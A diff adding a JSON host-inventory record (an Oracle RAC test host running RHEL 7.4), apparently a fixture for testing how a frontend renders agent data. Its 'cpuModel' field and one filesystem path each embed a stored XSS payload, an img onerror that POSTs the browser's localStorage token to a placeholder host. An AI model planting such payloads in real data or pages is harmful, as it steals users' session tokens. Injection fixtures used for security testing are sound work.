@@ -1,0 +1,52 @@
+{
+    "hostname": "rac1_x",
+    "environment": "TST",
+    "location": "Germany",
+    "info": {
+        "hostname": "rac1",
+        "cpuModel": "Intel(R) Xeon(R) CPU E5-2609 <img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>v4 @ 1.70GHz",
+        "cpuCores": 1,
+        "cpuThreads": 2,
+        "kernel": "4.1.12-103.3.8.1.el7uek.x86_64",
+        "os": "Red Hat Enterprise Linux",
+        "memoryTotal": 7,
+        "swapTotal": 7,
+        "cpuFrequency": "1.70GHz",
+        "cpuSockets": 1,
+        "coresPerSocket": 1,
+        "threadsPerCore": 2,
+        "kernelVersion": "4.1.12-103.3.8.1.el7uek.x86_64",
+        "osVersion": "7.4",
+        "hardwareAbstraction": "VIRT",
+        "hardwareAbstractionTechnology": "OVM"
+    },
+    "agentVersion": "1.6.5",
+    "tags": [],
+    "schemaVersion": 1,
+    "clusterMembershipStatus": {
+        "oracleClusterware": true,
+        "veritasClusterServer": false,
+        "sunCluster": false,
+        "hacmp": false
+    },
+    "filesystems": [
+        {
+            "filesystem": "/dev/mapper<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>/rootvg-root",
+            "size": 23622320128,
+            "mountedOn": "/",
+            "availableSpace": 18253611008,
+            "usedSpace": 3758096384,
+            "type": "ext4"
+        },
+        {
+            "filesystem": "/dev/xvda1",
+            "size": 296747008,
+            "mountedOn": "/boot",
+            "availableSpace": 81788928,
+            "usedSpace": 196083712,
+            "type": "ext4"
+        }
+    ],
+    "features": {},
+    "clusters": null
+}
